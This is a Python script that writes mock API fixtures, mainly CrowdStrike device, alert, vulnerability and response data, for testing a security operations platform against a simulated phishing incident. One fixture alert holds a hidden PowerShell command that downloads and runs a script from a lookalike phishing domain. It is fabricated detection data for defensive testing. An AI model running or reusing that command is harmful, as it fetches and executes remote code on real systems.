"""Generate vendor-shaped fixture files for every connector from ONE consistent scenario.

    python scripts/build_fixtures.py

Scenario (2026-09-20, tenant acme-demo.com): a credential-phishing campaign from
micros0ft-helpdesk.com reaches 8 users. Jane clicks, her laptop runs a PowerShell
payload, a Tor sign-in follows with an inbox forwarding rule, a Canary file-share
token trips from her laptop and she accesses a privileged Delinea secret. Bob reports
the mail. In parallel the estate carries Log4Shell / SmartScreen / HTTP2 findings
reported by overlapping scanners (Rapid7, CrowdStrike, Wiz, Defender) with
different identifiers for the same hosts, exercising asset resolution.

The fixtures are the only "data" fake-mode connectors see: the connector code path
(requests, pagination, normalisation) is identical to live mode.
"""

from __future__ import annotations

import json
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "soc_platform" / "fixtures"
D = "2026-09-20T"
ORG = "acme-demo.com"

USERS = {
    "jane": {"id": "u-jane-0001", "upn": f"jane.doe@{ORG}", "name": "Jane Doe", "dept": "Finance", "title": "Finance Analyst"},
    "bob": {"id": "u-bob-0002", "upn": f"bob.lee@{ORG}", "name": "Bob Lee", "dept": "IT", "title": "IT Support Engineer"},
    "raj": {"id": "u-raj-0003", "upn": f"raj.mehta@{ORG}", "name": "Raj Mehta", "dept": "Executive", "title": "Chief Executive Officer"},
    "priya": {"id": "u-priya-0004", "upn": f"priya.nair@{ORG}", "name": "Priya Nair", "dept": "Finance", "title": "Accounts Payable"},
    "arun": {"id": "u-arun-0005", "upn": f"arun.k@{ORG}", "name": "Arun Kumar", "dept": "Sales", "title": "Account Manager"},
    "meera": {"id": "u-meera-0006", "upn": f"meera.s@{ORG}", "name": "Meera Shah", "dept": "HR", "title": "HR Partner"},
    "tom": {"id": "u-tom-0007", "upn": f"tom.w@{ORG}", "name": "Tom White", "dept": "Legal", "title": "Counsel"},
    "li": {"id": "u-li-0008", "upn": f"li.chen@{ORG}", "name": "Li Chen", "dept": "Engineering", "title": "Developer"},
}

HOSTS = {
    "jane": {"hostname": "JANE-LT01", "fqdn": f"jane-lt01.{ORG}", "cs": "cs-aid-jane01", "mde": "mde-jane01",
             "aad": "aad-jane01", "serial": "5CG1234XYZ", "mac": "00-1A-2B-3C-4D-5E", "ip": "10.20.1.15",
             "os": "Windows 11 Enterprise", "platform": "Windows", "user": "jane"},
    "bob": {"hostname": "BOB-LT02", "fqdn": f"bob-lt02.{ORG}", "cs": "cs-aid-bob02", "mde": "mde-bob02",
            "aad": "aad-bob02", "serial": "5CG5678ABC", "mac": "00-1A-2B-3C-4D-6F", "ip": "10.20.1.22",
            "os": "Windows 11 Enterprise", "platform": "Windows", "user": "bob"},
    "web01": {"hostname": "web01", "fqdn": f"web01.{ORG}", "cs": "cs-aid-web01", "mde": "mde-web01",
              "serial": "VMware-42 1a 7c 3e", "ip": "10.10.0.5", "os": "Ubuntu 22.04 LTS", "platform": "Linux",
              "r7": 101, "wiz": "wiz-vm-web01",
              "cloud": "/subscriptions/sub-001/resourceGroups/prod/providers/Microsoft.Compute/virtualMachines/web01"},
    "db01": {"hostname": "DB01", "fqdn": f"db01.{ORG}", "mde": "mde-db01", "serial": "VMware-42 9f 11 02",
             "ip": "10.10.0.6", "os": "Windows Server 2019", "platform": "Windows", "r7": 102},
    "fs01": {"hostname": "FS01", "fqdn": f"fs01.{ORG}", "cs": "cs-aid-fs01", "mde": "mde-fs01", "serial": "CZ20240001",
             "ip": "10.10.0.20", "os": "Windows Server 2022", "platform": "Windows", "r7": 103},
}

PHISH = {
    "sender": "it-support@micros0ft-helpdesk.com", "sender_domain": "micros0ft-helpdesk.com",
    "display": "Microsoft 365 Support", "subject": "Action required: your password expires today",
    "url": "https://login.micros0ft-helpdesk.com/verify?u=jane.doe", "url_domain": "login.micros0ft-helpdesk.com",
    "nmid": "nm-7f3a-0001", "imid": "<20260920090200.1111@micros0ft-helpdesk.com>", "sender_ip": "185.220.101.4",
    "recipients": ["jane", "bob", "raj", "priya", "arun", "meera", "tom", "li"],
}
PAYLOAD_SHA = "a3f5c0e1b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6"
TOR_IP = "185.220.101.4"

CVES = {
    "CVE-2021-44228": {"cvss": 10.0, "sev": "Critical", "desc": "Apache Log4j2 JNDI remote code execution (Log4Shell)",
                       "product": "Apache Log4j 2.14.1", "kev": True, "epss": 0.97565},
    "CVE-2024-21412": {"cvss": 8.1, "sev": "High", "desc": "Internet Shortcut Files security feature bypass",
                       "product": "Microsoft Windows 11", "kev": True, "epss": 0.08771},
    "CVE-2023-44487": {"cvss": 7.5, "sev": "High", "desc": "HTTP/2 Rapid Reset denial of service",
                       "product": "nginx 1.18.0", "kev": True, "epss": 0.83104},
    "CVE-2023-38408": {"cvss": 9.8, "sev": "Critical", "desc": "OpenSSH ssh-agent PKCS#11 remote code execution",
                       "product": "OpenSSH 8.9p1", "kev": False, "epss": 0.14372},
    "CVE-2022-41082": {"cvss": 8.0, "sev": "High", "desc": "Microsoft Exchange Server RCE (ProxyNotShell)",
                       "product": "Microsoft Windows Server 2019", "kev": True, "epss": 0.97301},
}
# which host carries which CVE, per tool (deliberately overlapping and incomplete)
EXPOSURE = {
    "web01": ["CVE-2021-44228", "CVE-2023-44487", "CVE-2023-38408"],
    "jane": ["CVE-2024-21412"],
    "bob": ["CVE-2024-21412"],
    "db01": ["CVE-2022-41082"],
}


def route(method: str, path: str, body, *, params=None, select=None, status=200, body_contains=None):
    r = {"method": method, "path": path, "body": body, "status": status}
    if params:
        r["params"] = params
    if select:
        r["select"] = select
    if body_contains:
        r["body_contains"] = body_contains
    return r


def write(name: str, routes: list[dict]) -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / f"{name}.json").write_text(json.dumps({"routes": routes}, indent=1), encoding="utf-8")


# ----------------------------------------------------------------------------- CrowdStrike


def crowdstrike() -> None:
    devices = []
    for k, h in HOSTS.items():
        if "cs" not in h:
            continue
        devices.append({"device_id": h["cs"], "hostname": h["hostname"], "local_ip": h["ip"],
                        "external_ip": "203.0.113.10", "mac_address": h["mac"] if "mac" in h else None,
                        "serial_number": h["serial"], "os_version": h["os"], "platform_name": h["platform"],
                        "agent_version": "7.18.18209.0", "status": "normal", "last_seen": f"{D}10:00:00Z",
                        "tags": ["FalconGroupingTags/Finance"] if k == "jane" else []})
    j = HOSTS["jane"]
    alerts = [
        {"composite_id": "acme:ind:cs-aid-jane01:0001", "created_timestamp": f"{D}09:09:12Z", "severity": 85,
         "display_name": "PowerShell downloaded and executed a remote payload", "name": "PowerShellRemotePayload",
         "description": "A PowerShell process spawned by the browser downloaded and executed a script from an external domain.",
         "tactic": "Execution", "technique": "PowerShell", "technique_id": "T1059.001", "confidence": 90,
         "device": {"device_id": j["cs"], "hostname": j["hostname"], "local_ip": j["ip"], "os_version": j["os"],
                    "platform_name": "Windows"},
         "user_name": "ACME\\jane.doe", "filename": "invoice_viewer.ps1", "sha256": PAYLOAD_SHA,
         "cmdline": "powershell.exe -nop -w hidden -c iex(iwr https://login.micros0ft-helpdesk.com/p.ps1)",
         "parent_details": {"cmdline": "msedge.exe --single-argument https://login.micros0ft-helpdesk.com/verify"},
         "status": "new", "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-jane01:0001"},
        {"composite_id": "acme:ind:cs-aid-web01:0002", "created_timestamp": f"{D}07:40:00Z", "severity": 30,
         "display_name": "Unusual outbound connection from web server", "name": "UnusualOutbound",
         "description": "Low-confidence network anomaly.", "tactic": "Command and Control",
         "technique": "Application Layer Protocol", "technique_id": "T1071", "confidence": 30,
         "device": {"device_id": "cs-aid-web01", "hostname": "web01", "local_ip": "10.10.0.5", "os_version": "Ubuntu 22.04 LTS",
                    "platform_name": "Linux"},
         "user_name": "www-data", "status": "new",
         "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-web01:0002"},
    ]
    vulns = []
    for hk, cves in EXPOSURE.items():
        h = HOSTS[hk]
        if "cs" not in h or hk == "web01" and False:
            continue
        for cve in cves:
            if hk == "web01" and cve == "CVE-2023-38408":
                continue  # CrowdStrike does not see this one (scanner coverage differs)
            c = CVES[cve]
            vulns.append({"id": f"{h['cs']}_{cve}", "aid": h["cs"], "status": "open",
                          "created_timestamp": "2026-09-01T00:00:00Z", "updated_timestamp": f"{D}06:00:00Z",
                          "cve": {"id": cve, "base_score": c["cvss"], "severity": c["sev"].upper(),
                                  "exploit_status": 90 if c["kev"] else 30, "exprt_rating": "CRITICAL" if c["kev"] else "MEDIUM"},
                          "host_info": {"hostname": h["hostname"], "local_ip": h["ip"], "os_version": h["os"]},
                          "apps": [{"product_name_version": c["product"]}],
                          "remediation": {"entities": [{"action": f"Update {c['product'].split()[0]} to the latest version"}]}})
    ids = [d["device_id"] for d in devices]
    write("crowdstrike", [
        route("GET", r"^/devices/queries/devices/v1$", {"resources": [HOSTS["jane"]["cs"]], "meta": {}},
              params={"filter": "hostname:'JANE-LT01'"}),
        route("GET", r"^/devices/queries/devices/v1$", {"resources": [HOSTS["bob"]["cs"]], "meta": {}},
              params={"filter": "hostname:'BOB-LT02'"}),
        route("GET", r"^/devices/queries/devices/v1$", {"resources": [], "meta": {}}, params={"filter": "*"}),
        route("GET", r"^/devices/queries/devices/v1$",
              {"resources": ids, "meta": {"pagination": {"offset": 0, "limit": 100, "total": len(ids)}}}),
        route("POST", r"^/devices/entities/devices/v2$", {"resources": devices},
              select={"from": "json.ids", "list": "resources", "key": "device_id"}),
        route("GET", r"^/alerts/queries/alerts/v2$", {"resources": [alerts[0]["composite_id"]]},
              params={"filter": "device.device_id:'cs-aid-jane01'"}),
        route("GET", r"^/alerts/queries/alerts/v2$", {"resources": [alerts[0]["composite_id"]]},
              params={"filter": "user_name:'jane.doe'"}),
        route("GET", r"^/alerts/queries/alerts/v2$", {"resources": []}, params={"filter": "*"}),
        route("GET", r"^/alerts/queries/alerts/v2$", {"resources": [a["composite_id"] for a in alerts],
                                                      "meta": {"pagination": {"offset": 0, "total": len(alerts)}}}),
        route("POST", r"^/alerts/entities/alerts/v2$", {"resources": alerts},
              select={"from": "json.composite_ids", "list": "resources", "key": "composite_id"}),
        route("GET", r"^/spotlight/combined/vulnerabilities/v1$", {"resources": [], "meta": {"pagination": {}}},
              params={"after": "*"}),
        route("GET", r"^/spotlight/combined/vulnerabilities/v1$",
              {"resources": vulns, "meta": {"pagination": {"after": "page-2", "total": len(vulns)}}}),
        route("GET", r"^/iocs/combined/indicator/v1$",
              {"resources": [{"type": "domain", "value": "micros0ft-helpdesk.com", "action": "detect", "severity": "high"}]},
              params={"filter": "type:'domain'+value:'micros0ft-helpdesk.com'"}),
        route("GET", r"^/iocs/combined/indicator/v1$", {"resources": []}),
        route("POST", r"^/real-time-response/entities/sessions/v1$", {"resources": [{"session_id": "rtr-sess-001"}]}),
        route("POST", r"^/real-time-response/entities/command/v1$",
              {"resources": [{"stdout": "PID  NAME\n4120 powershell.exe\n5528 msedge.exe", "complete": True}]}),
        route("POST", r"^/devices/entities/devices-actions/v2$", {"resources": [{"id": "ok"}], "errors": []}),
    ])


if __name__ == "__main__":
    import sys

    sys.path.insert(0, str(Path(__file__).resolve().parent))
    from fixture_builders import BUILDERS  # noqa: E402

    for b in [crowdstrike, *BUILDERS]:
        b()
    print(f"{1 + len(BUILDERS)} fixture files written to {OUT}")
